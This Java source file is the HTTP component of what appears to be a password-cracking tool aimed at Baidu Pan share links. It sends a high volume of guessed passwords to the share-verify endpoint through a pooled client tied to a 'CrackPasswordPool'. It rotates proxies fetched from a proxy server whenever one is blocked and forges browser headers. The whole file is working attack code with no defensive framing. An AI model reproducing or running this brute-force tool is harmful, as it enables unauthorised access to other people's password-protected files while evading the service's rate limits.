package priv.light.baidu;

import com.fasterxml.jackson.databind.ObjectMapper;
import lombok.Data;
import lombok.NonNull;
import lombok.extern.slf4j.Slf4j;
import org.apache.hc.client5.http.classic.methods.HttpGet;
import org.apache.hc.client5.http.classic.methods.HttpPost;
import org.apache.hc.client5.http.config.RequestConfig;
import org.apache.hc.client5.http.entity.UrlEncodedFormEntity;
import org.apache.hc.client5.http.impl.ChainElement;
import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
import org.apache.hc.client5.http.impl.classic.HttpClients;
import org.apache.hc.client5.http.impl.io.PoolingHttpClientConnectionManager;
import org.apache.hc.core5.http.HttpHost;
import org.apache.hc.core5.http.NameValuePair;
import org.apache.hc.core5.http.ParseException;
import org.apache.hc.core5.http.io.entity.EntityUtils;
import org.apache.hc.core5.http.message.BasicNameValuePair;
import org.apache.hc.core5.io.CloseMode;

import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * @author Light
 * @date 2022/3/30 14:24
 */

@Slf4j
@Data
public class HttpUtil {

    public static final ObjectMapper OBJECT_MAPPER = new ObjectMapper();
    private static final String BAI_DU_PAN_URL = "http://pan.baidu.com/share/verify?%s";
    private static final int REQUEST_MAX;

    static {
        REQUEST_MAX = CrackPasswordPool.MAX_POOL_SIZE * 5;
    }

    private final HttpGet proxyServerUrl;
    private final AtomicReference<HttpPost> post;
    private final String sUrl;
    private final AtomicBoolean hasDispose;

    private final CloseableHttpClient httpClient;
    private final CloseableHttpClient proxyClient;
    private final ProxyResponseHandler proxyResponseHandler;

    public HttpUtil(@NonNull String sUrl, @NonNull HttpGet proxyServerUrl, @NonNull CrackPasswordPool crackPasswordPool) {
        this.sUrl = sUrl;
        this.proxyServerUrl = proxyServerUrl;
        this.proxyResponseHandler = new ProxyResponseHandler();

        List<NameValuePair> params = new ArrayList<>();
        params.add(new BasicNameValuePair("surl", this.sUrl));
        params.add(new BasicNameValuePair("web", "1"));
        params.add(new BasicNameValuePair("clienttype", "0"));

        String urlEncodeParams = null;
        try {
            urlEncodeParams = EntityUtils.toString(new UrlEncodedFormEntity(params), StandardCharsets.UTF_8);
        } catch (IOException | ParseException ignored) {
        }

        this.post = new AtomicReference<>(new HttpPost(String.format(BAI_DU_PAN_URL, urlEncodeParams)));
        prepareParameters(params);

        PoolingHttpClientConnectionManager connectionManager = new PoolingHttpClientConnectionManager();
        connectionManager.setMaxTotal(REQUEST_MAX);
        connectionManager.setDefaultMaxPerRoute(REQUEST_MAX);

        RetryStrategy retryStrategy = new RetryStrategy(crackPasswordPool);
        RetryStrategyExecutor requestBeforeInterceptor = new RetryStrategyExecutor(this, retryStrategy);
        this.httpClient = HttpClients.custom().replaceExecInterceptor(ChainElement.RETRY.name(), requestBeforeInterceptor).disableCookieManagement().setConnectionManager(connectionManager).evictExpiredConnections().build();

        PoolingHttpClientConnectionManager proxyConnectionManager = new PoolingHttpClientConnectionManager();
        connectionManager.setMaxTotal(REQUEST_MAX);
        connectionManager.setDefaultMaxPerRoute(REQUEST_MAX);

        this.proxyClient = HttpClients.custom().disableAutomaticRetries().setConnectionManager(proxyConnectionManager).evictExpiredConnections().build();
        this.proxyResponseHandler.setProxyClient(this.proxyClient);

        this.hasDispose = new AtomicBoolean();
    }

    public RequestConfig getHttpProxy() {
        return this.post.get().getConfig();
    }

    private void prepareParameters(List<NameValuePair> params) {
        this.post.get().setHeader("Host", "pan.baidu.com");
        this.post.get().setHeader("DNT", "1");
        this.post.get().setHeader("sec-ch-ua-mobile", "?0");
        this.post.get().setHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.46");
        this.post.get().setHeader("Accept", "application/json, text/javascript, */*; q=0.01");
        this.post.get().setHeader("X-Requested-With", "XMLHttpRequest");
        this.post.get().addHeader("sec-ch-ua-platform", "Windows");
        this.post.get().setHeader("Origin", "http://pan.baidu.com");
        this.post.get().setHeader("Sec-Fetch-Site", "same-origin");
        this.post.get().setHeader("Sec-Fetch-Mode", "cors");
        this.post.get().setHeader("Sec-Fetch-Dest", "empty");
        this.post.get().setHeader("Referer", String.format("http://pan.baidu.com/share/init?surl=%s", params.get(0)));
        this.post.get().setHeader("Accept-Encoding", "br");
        this.post.get().setHeader("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6");
        this.post.get().setHeader("Cookie", "");
        this.post.get().setHeader("Connection", "keep-alive");
        this.post.get().setHeader("Content-Type", "application/x-www-form-urlencoded");
    }

    public void executeRequest(String password) {
        if (this.hasDispose.get()) {
            return;
        }

        List<NameValuePair> formBody = new ArrayList<>();
        formBody.add(new BasicNameValuePair("pwd", password));

        try {
            HttpPost copyPost = new HttpPost(this.post.get().getUri());
            copyPost.setHeaders(this.post.get().getHeaders());
            copyPost.setEntity(new UrlEncodedFormEntity(formBody));
            copyPost.setConfig(this.getHttpProxy());

            this.httpClient.execute(copyPost);
        } catch (URISyntaxException ignored) {
        } catch (IOException e) {
            log.error("待处理的IO异常.", e);
        }
    }

    public void configProxy(HttpHost invalidHttpHost) {
        if (this.proxyHasUpdate(invalidHttpHost)) {
            return;
        }

        boolean getProxy = false;
        while (!getProxy) {
            try {
                TimeUnit.MILLISECONDS.sleep(1);
                if (this.proxyHasUpdate(invalidHttpHost)) {
                    return;
                }

                HttpHost proxy = this.proxyClient.execute(this.proxyServerUrl, this.proxyResponseHandler);
                if (proxy == null) {
                    continue;
                }

                RequestConfig requestConfig = RequestConfig.custom().setCircularRedirectsAllowed(true).setProxy(proxy).build();
                this.post.get().setConfig(requestConfig);
                getProxy = true;
            } catch (Exception e) {
                try {
                    TimeUnit.MILLISECONDS.sleep(1);
                } catch (InterruptedException ignored) {
                }
            }
        }
    }

    private boolean proxyHasUpdate(HttpHost invalidHttpHost) {
        if (invalidHttpHost == null) {
            return false;
        }

        HttpHost httpHost = this.post.get().getConfig().getProxy();
        return !invalidHttpHost.equals(httpHost);
    }

    public void dispose() {
        if (this.hasDispose.get()) {
            return;
        }

        this.httpClient.close(CloseMode.IMMEDIATE);
        this.proxyClient.close(CloseMode.IMMEDIATE);
        this.hasDispose.set(true);
    }

}
